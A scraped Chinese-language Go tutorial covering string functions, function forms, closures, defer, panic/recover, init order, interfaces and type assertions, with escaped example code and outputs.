strHaiCoder = Hello,HaiCoder strHaiCoder2 = Hello,HaiCoder strHaiCoder3 = Hello,HaiCoder strHaiCoder4 = Hello,HaiCoder strHaiCoder5 = Hello, 1024 HaiCoder   字符串长度总结 在 Go 语言要想获取字符串长度有四种方法，分别为：使用 bytes.Count() 获取、使用 strings.Count() 获取、使用 len() 获取 和使用 utf8.RuneCountInString() 获取。\n如果我们字符串中包含中文，推荐使用 utf8.RuneCountInString() 方法获取字符串长度。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  package main  import ( \t\u0026#34;bytes\u0026#34; \t\u0026#34;fmt\u0026#34; \t\u0026#34;strings\u0026#34; \t\u0026#34;unicode/utf8\u0026#34; )  func main() { \t//使用 bytes.Count() 获取字符串长度 \tstrHaiCoder := \u0026#34;嗨客网(Hello, HaiCoder)\u0026#34; \tstrCount := bytes.Count([]byte(strHaiCoder), nil) \tfmt.Println(\u0026#34;strCount =\u0026#34;, strCount) //结果输出了 21，但我们的字符串长度只有 20，所以使用 bytes.Count() 获取字符串长度需要减 1.  \tstrCount2 := strings.Count(strHaiCoder, \u0026#34;\u0026#34;) \tfmt.Println(\u0026#34;strCount2 =\u0026#34;, strCount2)  \tstrCount3 := len(strHaiCoder) \tstrCount4 := len([]rune(strHaiCoder)) \tfmt.Println(\u0026#34;strCount3 =\u0026#34;, strCount3, \u0026#34;strCount4 =\u0026#34;, strCount4) //中文算3个  \tstrCount5 := utf8.RuneCountInString(strHaiCoder) \tfmt.Println(\u0026#34;strCount5 =\u0026#34;, strCount5) //当我们使用 utf8.RuneCountInString() 函数获取字符串长度时，一个中文和一个英文字符的长度都为 1. }   golang中string底层是通过byte数组实现的。中文字符在unicode下占2个字节，在utf-8编码下占3个字节，而golang默认编码正好是utf-8。\n byte 等同于int8，常用来处理ascii字符 rune 等同于int32,常用来处理unicode或utf-8字符  分割字符串总结 在 Go 语言中，分割字符串我们可以分为几种情况，分别为：按空格分割、按字符串分割和按字符分割。Go 语言按空格分割字符串：\n1  arr := strings.Fields(s)   Go 语言按字符串分割字符串语法：\n1  arr := strings.Split(s,sep)   Go 语言按字符分割字符串语法：\n1  arr := strings.FieldsFunc(s,f func(rune) bool)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;strings\u0026#34; )  func checkSpiltRune(r rune) bool { \tif r \u0026gt; 97 { \treturn true \t} \treturn false } func main() { \t//使用 strings.Fields 函数，实现按空格分割字符串 \tstrHaiCoder := \u0026#34;嗨客网 Hello HaiCoder\u0026#34; \tstrArr := strings.Fields(strHaiCoder) \tfmt.Println(\u0026#34;strArr =\u0026#34;, strArr)  \tstrHaiCoder2 := \u0026#34;Hello,HaiCoder Hello,World\u0026#34; \tstrArr2 := strings.Split(strHaiCoder2, \u0026#34;Hello\u0026#34;) \tfmt.Println(\u0026#34;strArr2 =\u0026#34;, strArr2)  \tstrHaiCoder3 := \u0026#34;Hello,HaiCoder,Hello,World\u0026#34; \tstrArr3 := strings.FieldsFunc(strHaiCoder3, checkSpiltRune) \tfmt.Println(\u0026#34;strArr3 =\u0026#34;, strArr3)  }  strArr = [嗨客网 Hello HaiCoder] strArr2 = [ ,HaiCoder ,World] strArr3 = [H ,Ha C ,H ,W]   字符串出现次数总结 在开发过程中，很多时候我们有统计单个字符或者字符串在另一个字符串中出现次数的需求，在 Go 语言 中，统计字符串出现次数我们使用 Strings.count() 函数。Go 语言 Strings.count() 函数语法：\n1  func Count(s, substr string) int   查找字符串总结 在开发过程中，很多时候我们有在一个字符串中查找另一个字符串的需求，在 Go 语言中，在一个字符串中查找另一个字符串我们使用 Strings.Index() 系列函数。Go 语言 Strings.Index() 系列函数语法：\n1  func Index(s, substr string) int   Strings.Index() 函数返回的是字符串第一个出现的位置，而 Strings.LastIndex() 函数返回的是字符串最后一次出现的位置。Go 语言 Strings.LastIndex() 系列函数语法：\n1  func LastIndex(s, substr string) int   在 Go 语言中，在一个字符串中从开始查找另一个字符序列我们使用 Strings.IndexAny() 函数，从结尾往前查找我们使用 Strings.LastIndexAny() 函数。Go 语言 IndexAny() 函数语法：\n1  func IndexAny(s, chars string) int   Go 语言 LastIndexAny() 函数语法：\n1  func LastIndexAny(s, chars string) int   在 Go 语言中，在一个字符串中从开始查找一个字符我们使用 Strings.IndexByte() 函数，从结尾往前查找我们使用 Strings.LastIndexByte() 函数。Go 语言 IndexByte() 函数语法：\n1  func IndexByte(s, chars string) int   Go 语言 LastIndexByte() 函数语法：\n1  func LastIndexByte(s, chars string) int   在 Go 语言中，在一个字符串中从开始查找一个中文字符我们使用 Strings.IndexRune() 函数，从结尾往前查找我们使用 Strings.LastIndexRune() 函数。Go 语言 IndexRune() 函数语法：\n1  func IndexRune(s string, r rune) int   Go 语言 LastIndexRune() 函数语法：\n1  func LastIndexRune(s string, r rune) int   在 Go 语言中，在一个字符串中查找满足特定条件字符我们可以使用 Strings.IndexFunc() 函数。Go 语言 IndexFunc() 函数语法：\n1  func IndexFunc(s string, f func(rune) bool) int   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;strings\u0026#34; )  func checkRune(r rune) bool { \tif r == \u0026#39;G\u0026#39; || r == \u0026#39;a\u0026#39; { \treturn true \t} \treturn false } func main() { \t//使用 Strings.IndexFunc() 函数，查找字符串中满足特定条件的字符 \tstrHaiCoder := \u0026#34;I love Golang and I study Golang From HaiCoder\u0026#34; \tindexFunc := strings.IndexFunc(strHaiCoder, checkRune) \tfmt.Println(\u0026#34;indexFunc =\u0026#34;, indexFunc) }  indexFunc = 7   字符串开头结尾总结 在 Go 语言中，判断某个字符串是否以某个字符或者是否以某个字符串开头的函数为 strings.HasPrefix() 。Go 语言 strings.HasPrefix() 函数语法：\n1  Strings.HasPrefix(s, prefix string) bool   在 Go 语言中，判断某个字符串是否以某个字符或者是否以某个字符串结尾的函数为 strings.HasSuffix() 。Go 语言 strings.HasSuffix() 函数语法：\n1  func HasSuffix(s, suffix string) bool   大小写转换 在开发过程中，很多时候我们需要将一个字符串首字母转成大写的需求，在 Go 语言中，将某个字符串的首字母转成大写的函数为 strings.ToTitle() 。Go 语言 strings.ToTitle() 函数语法：\n1  func ToTitle(s string) string   在 Go 语言中，将某个字符串的大写字符转成小写使用的函数为 ToLower() 。Go 语言 ToLower() 函数语法：\n1  func ToLower(s string) string   在 Go 语言中，将某个字符串的小写字符转成大写使用的函数为 ToUpper() 。Go 语言 ToUpper() 函数语法：\n1  func ToUpper(s string) string   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;strings\u0026#34; )  func main() { \t//使用 Strings.IndexFunc() 函数，查找字符串中满足特定条件的字符 \tstrHaiCoder := \u0026#34;i study Golang From HaiCoder\u0026#34; \tstrToTitle := strings.ToTitle(strHaiCoder) \tfmt.Println(strToTitle) \tstrToLower := strings.ToLower(strHaiCoder) \tfmt.Println(strToLower) \tstrToUpper := strings.ToUpper(strHaiCoder) \tfmt.Println(strToUpper) \tstrTitle := strings.Title(strHaiCoder) \tfmt.Println(strTitle) }  I STUDY GOLANG FROM HAICODER i study golang from haicoder I STUDY GOLANG FROM HAICODER I Study Golang From HaiCoder   去除字符串总结 在 Go 语言中，去除字符串中空格的函数为 TrimSpace() 。Go 语言 TrimSpace() 函数语法：\n1  func TrimSpace(s string) string   使用 TrimSpace() 函数的默认参数，只可以去除字符串的左右两边的空格，中间的空格无法删除。\n在 Go 语言中，去除字符串中指定字符串的函数为 Trim() 。Go 语言 Trim() 函数语法：\n1  func Trim(s string, cutset string) string   使用 Trim() 函数，不能去除字符串中间包含中指定字符串。\n在 Go 语言中，去除字符串中左边指定字符串的函数为 TrimLeft() 。Go 语言 TrimLeft() 函数语法：\n1  func TrimLeft(s string, cutset string) string   在 Go 语言中，去除字符串中右边指定字符串的函数为 TrimRight() 。Go 语言 TrimRight() 函数语法：\n1  func TrimRight(s string, cutset string) string   在 Go 语言中，去除字符串中字符串前缀的函数为 TrimPrefix() 。Go 语言 TrimPrefix() 函数语法：\n1  func TrimPrefix(s string, cutset string) string   在 Go 语言中，去除字符串中字符串后缀的函数为 TrimSuffix() 。Go 语言 TrimSuffix() 函数语法：\n1  func TrimSuffix(s string, cutset string) string   在 Go 语言中，去除字符串中指定规则字符串的函数为 TrimFunc() 。Go 语言 TrimFunc() 函数语法：\n使用 TrimFunc() 函数，只能去除字符串中左边和右边符合指定规则字符串，中间的不能去除。\n1  func TrimFunc(s string, f func(rune) bool) string   1  func TrimLeftFunc(s string, f func(rune) bool) string   1  func TrimRightFunc(s string, f func(rune) bool) string   包含子串总结 判断一个字符串是否是另一个字符串的子串，Golang 给我们提供了一个 Contains 函数。Go 语言 Contains() 函数语法：\n1  func Contains(s, substr string) bool   判断一个字符是否在另一个字符串中，Golang 给我们提供了一个 ContainsRune 函数。Go 语言 ContainsRune() 函数语法：\n1  func ContainsRune(s string, r rune) bool   判断一个字符序列中的任意一个字符是否是另一个字符串中，Golang 给我们提供了一个 ContainsAny 函数。Go语言 ContainsAny() 函数语法：\n1  func ContainsAny(s, substr string) bool   遍历处理总结 在 Go 语言中，提供了 strings.Map() 函数用于对一个字符串中的每一个字符都做相对应的处理的功能。Go 语言 Map() 函数语法：\n1  func Map(mapping func(rune) rune, s string) string   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;strings\u0026#34; )  func strEncry(r rune) rune { \tif r \u0026gt;= \u0026#39;A\u0026#39; \u0026amp;\u0026amp; r \u0026lt;= \u0026#39;Z\u0026#39; { \treturn r + 1 \t} \treturn r } func main() { \t//使用 strings.Map() 函数，实现将一个字符串中的大写字符都后移一位 \tstrHaiCoder := \u0026#34;嗨客网(HaiCoder)\u0026#34; \tmapStr := strings.Map(strEncry, strHaiCoder) \tfmt.Println(\u0026#34;mapStr =\u0026#34;, mapStr) }  mapStr = 嗨客网(IaiDoder)   字符串比较总结 在 Go 语言中，比较两个字符串是否完全相等，可以使用 ==。Go 语言使用 == 比较字符串相等语法：\n如果相等，则返回 true，否则，返回 false。\n1  str1 == str2   在 Go 语言中，比较两个字符串大小是否完全相等，可以使用 strings.Compare。Go 语言使用 Compare 比较字符串相等语法：\n比较字符串 a 和字符串 b 是否相等，如果 a \u0026gt; b，返回一个大于 0 的数，如果 a == b，返回 0，否则，返回负数。\n1  func Compare(a, b string) int   在 Go 语言中，忽略大小写比较两个字符串是否相等，可以使用 strings.EqualFold。Go 语言使用 EqualFold 比较字符串相等语法：\n如果相等，则返回 true，否则，返回 false。\n1  func EqualFold(s, t string) bool   字符串重复总结 在 Go 语言中，将一个字符串重复，我们可以使用 strings.Repeat() 函数 。Go 语言 strings.Repeat() 函数语法：\n1  func Repeat(s string, count int) string   字符串全部替换总结 在 Go 语言中，将某个字符串全部替换成新的字符串的需求，我们可以通过 strings.ReplaceAll() 函数来实现。Go 语言 strings.ReplaceAll() 函数语法：\n1  func ReplaceAll(s, old, new string) string   在 Go 语言中，将某个字符串替换成新的字符串的需求，我们可以通过 strings.Replace() 函数来实现。Go 语言 strings.Replace() 函数语法：\n1  func Replace(s, old, new string, n int) string   如果参数 n，传入的是负数，那么表明将字符串 s 中所有的 old 全部替换成 new。\n函数 为了完成某一功能的程序指令（语句）的集合，称为函数。Go 语言 的函数可以分为：自定义函数和系统函数。\nGo 语言函数与其他语言函数最大的不同是，Go 语言的函数可以支持 返回任意多个值，而其他语言的函数一般只支持返回一个值。\nGo 语言的函数也支持普通函数、匿名函数 和 闭包 三种形式。\nGo 语言函数属于 “一等公民”，所以：\n 函数本身可以作为值进行传递。 支持匿名函数和闭包（closure）。 函数可以满足接口。  Go语言函数声明与定义总结 在 Go 语言中，使用函数前，必须先声明与定义函数。Go 语言的函数由 关键字 func、函数名、参数列表、返回值、函数体和返回语句组成。Go 语言函数声明与定义语法：\n1 2 3 4  func funcName(param1 param1Type, param2 param2Type, ...)(returnVal returnType){ \t//执行语句... \treturn valuelist }   Go语言函数参数返回值总结 Go 语言中函数可以不返回任何值，也可以返回一个或者多个值。Go 语言函数不返回任何值语法：\n1 2 3  func funcName(param1, param2 paramType1, ...){ \t//执行语句... }   Go 语言函数返回多个值语法：\n1 2 3 4  func funcName(param1, param2 paramType1, ...)(returnType1, returnType2, ...){ \t//执行语句... \treturn 返回值列表 }   当返回值是多个时，需要将 returnType 的列表使用小括号括起来，不然语法会报错。调用函数时，也必须使用相对于的参数个数来接受返回值，如果不需要的返回值，我们可以使用匿名变量来接受保存。\nGo 语言的函数的返回值我们可以显式的指定返回值的名称，在显式指定返回值名称的时候，如果相邻的几个返回值的类型相同，那么我们可以省略前几个返回值的类型，只需要写最后一个返回值的类型。Go 语言函数不返回任何值语法：\n1 2 3 4 5  func funcName(param1, param2 paramType1, ...)(returnVal returnType){ \t// 执行语句...  returnVal = val  return }   Go 语言函数返回多个值语法：\n1 2 3 4  func funcName(param1, param2 paramType1, ...)(returnVal1, returnVal2 returnType ...){ \t// 执行语句... \treturn 返回值列表 }   在显式指定返回值名称的时候，如果相邻的几个返回值的类型相同，那么我们可以省略前几个返回值的类型，只需要写最后一个返回值的类型。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  package main import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;math\u0026#34; ) func getPageCount(pageSize int)(isOk bool, pageCount int){ \tif pageSize \u0026lt;= 0{ \treturn \t} \tpageCount = int(math.Ceil(float64(100/pageSize))) \tisOk = true \treturn } func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \t//Go语言的函数可以返回多个值 \tif isOk, pageCount := getPageCount(10); !isOk{ \tfmt.Println(\u0026#34;Error\u0026#34;) \t}else{ \tfmt.Println(\u0026#34;Ok, PageCount =\u0026#34;, pageCount) \t} }   Go语言函数参数可变参数总结 在 Go 语言中，函数的参数可以支持指定任意的个数与数据类型，这就是 Go 语言函数的可变参数。Golang 中函数的可变参数，必须是函数的最后一个参数，使用的形式是 ...。Go 语言函数可变参数定义：\n1 2  func funName(args ...paramType){ }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  package main import ( \t\u0026#34;fmt\u0026#34; ) func sum(args ...int)int{ \tsum := 0 \tfor _, arg := range args{ \tsum += arg \t} \treturn sum } func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \t//Go语言函数可变参数，可以传入任意个数的参数 \tretSum1 := sum(10, 20) \tretSum2 := sum(10, 20, 30, 50) \tfmt.Println(\u0026#34;retSum1 =\u0026#34;, retSum1, \u0026#34;, retSum2 =\u0026#34;, retSum2) }   在 Go 语言中，函数的可变参数除了可以支持指定任意的个数，还可以支持任意的数据类型 。Go 语言函数可变参数定义语法：\n1 2  func funName(args ...interface{}){ }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  package main import ( \t\u0026#34;fmt\u0026#34; ) func haiPrint(args ...interface{}){ \tfor _, arg := range args { \tswitch arg.(type) { \tcase int: \tfmt.Println(arg, \u0026#34;type is int\u0026#34;) \tcase string: \tfmt.Println(arg, \u0026#34;type is string\u0026#34;) \tcase int64: \tfmt.Println(arg, \u0026#34;type is int64\u0026#34;) \tcase float64: \tfmt.Println(arg, \u0026#34;type is float64\u0026#34;) \tdefault: \tfmt.Println(arg, \u0026#34;type is unknown\u0026#34;) \t} \t} } func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \t//Go语言函数可变参数，可以传入任意个数与任意类型 \thaiPrint(\u0026#34;Hello\u0026#34;, \u0026#34;HaiCoder\u0026#34;, 3, 100.1) }   Go语言函数参数变量总结 在 Go 语言中，函数也是一种类型，可以和其他数据类型一样保存在变量中。Go 语言函数变量语法：\n1 2 3 4  func fun() { }  var f func()  f = fun   Go 语言带参数的函数变量定义：\n1 2 3 4  func fun(int)string { }  var f func(int) string  f = fun   Go 语言的匿名函数可以作为一种类型被赋值给函数类型的变量，匿名函数也往往以变量方式传递。Go 语言匿名函数定义：\n1 2 3  func(paramters)(returnvals){  //do something }   Go 语言匿名函数调用定义：\n1 2 3  func(paramters)(returnvals){  //do something }(realParamters)   Go 语言的匿名函数可以直接赋值给变量， 也可以作为函数的参数，传递给函数。Go 语言匿名函数赋值给变量语法：\n1 2 3  f = func(paramters)(returnvals){  //do something }   Go 语言匿名函数做参数语法：\n1 2  func walk(lis []int, callback func(int)){ }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  package main import ( \t\u0026#34;fmt\u0026#34; ) func print(num int){ \tfmt.Println(\u0026#34;Num =\u0026#34;, num) } func walk(lis []int, callback func(int)){ \tfor _, i := range lis{ \tcallback(i) \t} } func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \t//Go语言匿名函数做参数，可以先定义出函数 \tslice := []int{1, 2, 3, 4} \twalk(slice, print) }   1 2 3 4  Num = 1 Num = 2 Num = 3 Num = 4   Go语言闭包总结 闭包就是一个函数和与其相关的引用环境组合的一个整体。\n在 Go 语言中，被捕获到闭包中的变量让闭包本身拥有了记忆效应，闭包中的逻辑可以修改闭包捕获的变量，变量会跟随闭包生命期一直存在，闭包本身就如同变量一样拥有了记忆功能。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  package main  import ( \t\u0026#34;fmt\u0026#34; \t\u0026#34;strings\u0026#34; )  func AddUpper() func(int) int { \tvar n int = 20 \treturn func(x int) int { \tn = n + x \treturn n \t} } func makeSuffix(suffix string) func(string) string { \treturn func(name string) string { \tif !strings.HasSuffix(name, suffix) { \treturn name + suffix \t} \treturn name \t} } func main() { \t//Go语言闭包记忆效应，实现累加 \tf := AddUpper() \tfmt.Println(\u0026#34;闭包返回：\u0026#34;, f(1)) \tfmt.Println(\u0026#34;闭包返回：\u0026#34;, f(2)) \tfmt.Println(\u0026#34;闭包返回：\u0026#34;, f(3))  \t//Go语言闭包，实现判断文件后缀 \tf1 := makeSuffix(\u0026#34;.jpg\u0026#34;) \tfmt.Println(\u0026#34;FileName =\u0026#34;, f1(\u0026#34;sea\u0026#34;)) \tfmt.Println(\u0026#34;FileName =\u0026#34;, f1(\u0026#34;sun.jpg\u0026#34;)) } //闭包返回： 21 //闭包返回： 23 //闭包返回： 26 //FileName = sea.jpg //FileName = sun.jpg   Go语言defer总结 在我们编写函数时，经常需要创建资源（比如：数据库连接、文件句柄、锁等），为了在函数执行完毕后，及时释放资源，Go 语言设计者提供了 defer(延时机制)。\n如果一个函数里面有多个 defer 语句，那么这些 defer 语句将会按照书写的逆序进行，也就是说，先被 defer 的语句最后被执行，最后被 defer 的语句，最先被执行。Go 语言 defer 语法：\n1 2 3 4  func funcName(params)returnVal{ \tdefer statement  //do something }   Go 语言的 defer 语句 一般都是用来处理需要关闭的资源。如果同一个函数中，既有 defer 语句，同时也有 return 语句，那么 defer 语句会在 return 语句的后面执行。\nGo语言函数错误处理总结 在 golang 中，一般处理函数异常的方式，是通过返回值返回错误的形式。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  package main import ( \t\u0026#34;errors\u0026#34; \t\u0026#34;fmt\u0026#34; ) // 定义除数为0的错误 var errDiv = errors.New(\u0026#34;division by zero\u0026#34;) func div(dividend, divisor int) (int, error) { \t// 判断除数为0的情况并返回 \tif divisor == 0 { \treturn 0, errDiv \t} \t// 正常计算，返回空错误 \treturn dividend / divisor, nil } func main() {  // 函数返回错误信息 \tif ret, err := div(2, 0); err != nil{ \tfmt.Println(\u0026#34;Div err, Err =\u0026#34;, err) \t}else{ \tfmt.Println(\u0026#34;Div ok, Ret =\u0026#34;, ret) \t} }   Go语言panic总结 在 Go 语言中，处理类似致命的错误的方法一般是通过 pannic 的方式来终止我们程序的执行。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  package main import ( \t\u0026#34;fmt\u0026#34; ) func div(dividend, divisor int) int { \t// 判断除数为0的情况并返回 \tif divisor == 0 { \tpanic(\u0026#34;divisor is zero\u0026#34;) \t} \t// 正常计算，返回空错误 \treturn dividend / divisor } func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \t// 函数返回错误信息 \tret := div(2, 0) \tfmt.Println(\u0026#34;Div ok, Ret =\u0026#34;, ret) }   Go语言recover总结 我们希望我们程序在发生错误后，我们能够做一些处理，保证程序可以继续运行，那么这时候，我们就需要使用异常恢复，即 recover。Golang 中的 recover 一般都是配套 defer 一起使用。Go 语言 recover 语法：\n1 2 3 4 5  defer func() {  if r := recover(); r != nil {  fmt.Println(\u0026#34;Recovered in f\u0026#34;, r)  } }()   我们在 defer 中，使用 if 判断 ，如果程序出现了异常，那么我们使用 recover 尝试恢复，并且打印异常信息。\npanic和recover使用原则\n defer 需要放在 panic 之前定义，另外 recover 只有在 defer 调用的函数中才有效。 recover 处理异常后，逻辑并不会恢复到 panic 那个点去，函数跑到 defer 之后的那个点。 多个 defer 会形成 defer 栈，后定义的 defer 语句会被最先调用  Go语言panic和recover的关系\n如果有 panic 但没有 recover，那么程序会宕机。如果有 panic 也有 recover，程序不会宕机，执行完对应的 defer 后，从宕机点退出当前函数后继续执行。\n虽然 panic/recover 能模拟其他语言的异常机制，但并不建议在编写普通函数时也经常性使用这种特性。在 panic 触发的 defer 函数内，可以继续调用 panic，进一步将错误外抛，直到程序整体崩溃。\nGo语言统计函数执行时长总结 在 Go 语言中，统计函数的执行时长，最简单的方法就是在函数开始的时候计算时间，在函数运行结束时，计算函数的总运行时长。Go 语言统计函数执行时间语法：\n1 2 3 4 5  func funcName(){  start := time.Now()  //Do something  elapsed := time.Since(start) }   Go语言命令行参数继续总结 flag 包提供的命令行参数解析的方式可以通过 key 和 value 的形式来获取。Go 语言解析命令行参数语法：\n1 2  flag.StringVar(\u0026amp;user, \u0026#34;u\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;账号，默认为root\u0026#34;) flag.IntVar(\u0026amp;port, \u0026#34;P\u0026#34;, 3306, \u0026#34;端口号，默认为3306\u0026#34;)   也可以使用：\n1 2  flag.String(\u0026#34;u\u0026#34;, \u0026#34;root\u0026#34;, \u0026#34;账号，默认为root\u0026#34;) flag.Int(\u0026#34;P\u0026#34;, 3306, \u0026#34;端口号，默认为3306\u0026#34;)   go语言init函数总结 Go 语言程序每一个源文件都可以包含一个 init 函数，该函数会在 main 函数之前执行，被 Go 语言框架调用，也就是说 init 会在 main 函数之前被调用。\n如果一个文件同时包含全局变量定义 ，init 函数和 main 函数，那么最先执行的是全局变量的定义，接着是 init 函数，最后执行的时候 main 函数。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  package main  import ( \t\u0026#34;fmt\u0026#34; )  func cfgFileName() string { \tfmt.Println(\u0026#34;Call Global Var init\u0026#34;) \treturn \u0026#34;cfg.ini\u0026#34; }  var CfgFile = cfgFileName()  func init() { \tfmt.Println(\u0026#34;Call init\u0026#34;) } func main() { \t//最先执行的是全局变量的定义，接着是 init 函数，最后执行的时候 main 函数。 \tfmt.Println(\u0026#34;In main\u0026#34;) }   接口 go语言接口特性 在 Golang 中，接口有以下几个特点：\n 可以包含 0 个或者多个方法的签名。 只定义方法的签名、不包含实现。 实现接口不需要显式的声明、只需实现相应方法即可。  Go语言接口与其他语言接口 Go 语言的接口设计是非侵入式的，接口编写者无须知道接口被哪些类型实现。而接口实现者只需知道实现的是什么样子的接口，但无须指明实现哪一个接口。\n编译器知道最终编译时使用哪个类型实现哪个接口，或者接口应该由谁来实现。\n在 Go 语言中，接口和类型之间是多对多的关系，即一个类型可以实现多个接口，同时，一个接口也可以被多个类型所实现。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  package main  import ( \t\u0026#34;fmt\u0026#34; )  // 在 Golang 中，一个类型可以实现多个接口 type MyWriter interface { \tMyWriter(note string) } type MyCloser interface { \tMyCloser() } type WriterCloser struct { }  func (wc WriterCloser) MyWriter(note string) { \tfmt.Println(\u0026#34;Call WriterCloser MyWriter, Note =\u0026#34;, note) } func (wc WriterCloser) MyCloser() { \tfmt.Println(\u0026#34;Call WriterCloser MyCloser\u0026#34;) }  // 在 Golang 中，一个接口也可以被多个类型实现 type SocketWriter struct { } type FileWriter struct { }  func (s SocketWriter) MyWriter(note string) { \tfmt.Println(\u0026#34;Call SocketWriter MyWriter, Note =\u0026#34;, note) } func (s FileWriter) MyWriter(note string) { \tfmt.Println(\u0026#34;Call FileWriter MyWriter, Note =\u0026#34;, note) } func main() { \tvar writerCloser WriterCloser \twriterCloser.MyWriter(\u0026#34;Hello Golang\u0026#34;) \twriterCloser.MyCloser()  \tvar socketWriter SocketWriter \tvar fileWriter FileWriter \tsocketWriter.MyWriter(\u0026#34;Hello Golang\u0026#34;) \tfileWriter.MyWriter(\u0026#34;Hello Python\u0026#34;) }  //Call WriterCloser MyWriter, Note = Hello Golang //Call WriterCloser MyCloser //Call SocketWriter MyWriter, Note = Hello Golang //Call FileWriter MyWriter, Note = Hello Python   Golang类型断言总结 因为在 Golang 中，接口变量的动态类型是变化的，有时我们需要知道一个接口变量的动态类型究竟是什么，这就需要使用类型断言，类型断言就是对接口变量的类型进行检查。Go 语言类型断言语法：\n1  value, ok := x.(T)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  package main import ( \t\u0026#34;fmt\u0026#34; ) func main() { \tfmt.Println(\u0026#34;嗨客网(www.haicoder.net)\u0026#34;) \t// 类型断言的判断，支持 switch 语句 \tvar intvalue interface{} \tintvalue = 99.8 \tswitch intvalue.(type) { \tcase int: \tfmt.Println(\u0026#34;Type Int, Value =\u0026#34;, intvalue.(int)) \tcase float32: \tfmt.Println(\u0026#34;Type Float32, Value =\u0026#34;, intvalue.(float32)) \tcase float64: \tfmt.Println(\u0026#34;Type Float64, Value =\u0026#34;, intvalue.(float64)) \tcase string: \tfmt.Println(\u0026#34;Type string, Value =\u0026#34;, intvalue.(string)) \t} } //Type Float64, Value = 99.8   在 Golang 中，将一个接口类型转换成另一个接口类型，或者将一个接口转换为另一个基本类型，都必须需要使用类型断言。Go 语言接口类型转换语法：\n1  value, ok := x.(T)   将接口 x 转换成 T 类型。 如果转换成功，返回转换成功后的值，即 value，ok 为 true。如果转换失败，value 为 零值，ok 为 false。Go 语言接口类型转换语法：\n1  value := x.(T)   将接口 x 转换成 T 类型。 如果转换成功，返回转换成功后的值，即 value，如果转换失败，程序会 panic。\nGolang接口嵌套总结 在 Go 语言中接口与接口之间也可以嵌套，通过接口的嵌套我们可以定义出新的接口。只有实现接口中所有的方法，包括被包含的接口的方法，才算是实现了接口。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  package main  import ( \t\u0026#34;fmt\u0026#34; )  type SReadWriter struct { } type MyReader interface { \tReaderFunc() } type MyWriter interface { \tWriterFunc(str string) } type MyReadWriter interface { \tMyReader \tMyWriter }  func (m SReadWriter) ReaderFunc() { \tfmt.Println(\u0026#34;Call ReaderFunc\u0026#34;) } func (m SReadWriter) WriterFunc(str string) { \tfmt.Println(\u0026#34;Call WriterFunc Str =\u0026#34;, str) } func main() { \t// 必须实现嵌套的接口的所有方法，才算实现接口 \tvar s interface{} \tvar readWriter SReadWriter \ts = readWriter \treadWriter.ReaderFunc() \treadWriter.WriterFunc(\u0026#34;Hello HaiCoder\u0026#34;) \tif reader, isOk := s.(MyReader); isOk { \tfmt.Println(\u0026#34;SReadWriter is type of MyReader, Reader =\u0026#34;, reader) \t} \tif writer, isOk := s.(MyWriter); isOk { \tfmt.Println(\u0026#34;SReadWriter is type of MyReader, Writer =\u0026#34;, writer) \t} \tif readWriter, isOk := s.(MyReadWriter); isOk { \tfmt.Println(\u0026#34;SReadWriter is type of MyReader, ReadWriter =\u0026#34;, readWriter) \t} } //Call ReaderFunc //Call WriterFunc Str = Hello HaiCoder //SReadWriter is type of MyReader, Reader = {} //SReadWriter is type of MyReader, Writer = {} //SReadWriter is type of MyReader, ReadWriter = {}   Go语言空接口教程 Go 语言 中的空接口是 接口 类型的一种特殊的形式，即是一个没有任何 方法 的接口。因为，空接口没有任何方法，因此，我们可以说 Golang 中的任何 数据类型 都实现了空接口。空接口是任何类型的父接口。\n使用空接口保存一个数据的过程会比直接用数据对应类型的 变量 保存稍慢。因此在开发中，应在需要的地方使用空接口，而不是在所有地方使用空接口。\n","permalink":"https://kevinerr.github.io/posts/tech/go%E7%9A%84%E5%B0%81%E8%A3%85%E7%BB%A7%E6%89%BF%E5%92%8C%E5%A4%9A%E6%80%81/","summary":"封装 封装主要是通过访问权限控制实现的。 在Java中，共有public 、protected、default、private这四种权限控制。 而相","title":"Go的封装、继承和多态"},{"content":"树与图的存储 树是一种特殊的图，与图的存储方式相同。 对于无向图中的边ab，存储两条有向边a-\u0026gt;b, b-\u0026gt;a。 因此我们可以只考虑有向图的存储。\n(1) 邻接矩阵：g[a][b] 存储边a-\u0026gt;b\n(2) 邻接表：\n1 2 3 4 5 6 